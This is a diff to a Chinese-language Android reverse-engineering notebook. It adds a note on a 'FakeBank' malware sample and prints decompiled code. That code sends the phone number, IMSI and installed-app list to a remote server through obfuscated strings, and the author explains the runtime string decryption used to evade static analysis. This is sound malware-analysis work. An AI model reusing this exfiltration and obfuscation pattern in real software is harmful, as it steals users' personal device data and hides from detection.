@@ -180,3 +180,27 @@ dex2jar可以將apk裡頭的class.dex檔，轉成jar檔
 感覺這段有問題阿XD
 
 ```
+```
+20180514
+在FakeBank.B裡頭，這段程式碼裡頭，
+
+public void run()
+{
+String str = Config.get(CoreService.mContext, run("U=Tko6Xm/dU3RgE3llt5Mz+f"), Config.SERVER_HOST) + Config.SERVER_ADDRESS          + run("Q=AHRwcbACkJFQUJQTABjWd2TzKg") + Config.getPhoneNumber(App.this.mContext).trim() + run("==MwbWJiQ0EBktx0MwZz") + Config.getIMSI(App.this.mContext).trim() + run("==QvbWInLAdhQ0QBKIokMwei") + URLEncoder.encode(App.this.getApps().trim());
+System.out.println(run("s0tIdA917ARdYjcFBTVGRiRbQ3QiVzBiTvbsrDNFAUfaKEJF") + str);
+    try
+    {
+      new Connect().getHttpConnection(str);
+      return;
+    }
+    catch (Exception localException) {}
+}
+run("U=Tko6Xm/dU3RgE3llt5Mz+f")
+run("Q=AHRwcbACkJFQUJQTABjWd2TzKg")
+run("==MwbWJiQ0EBktx0MwZz")
+.
+.
+.
+這些是透過一個Function叫private static String run(String paramAnonymousString)進行解密的
+方法看起來是自己硬刻出來的，目的應是在於躲過靜態分析用，因為那些字串都是亂碼，然後解密的過程在記憶體裡頭操作，感覺與加殼有點類似。
+```
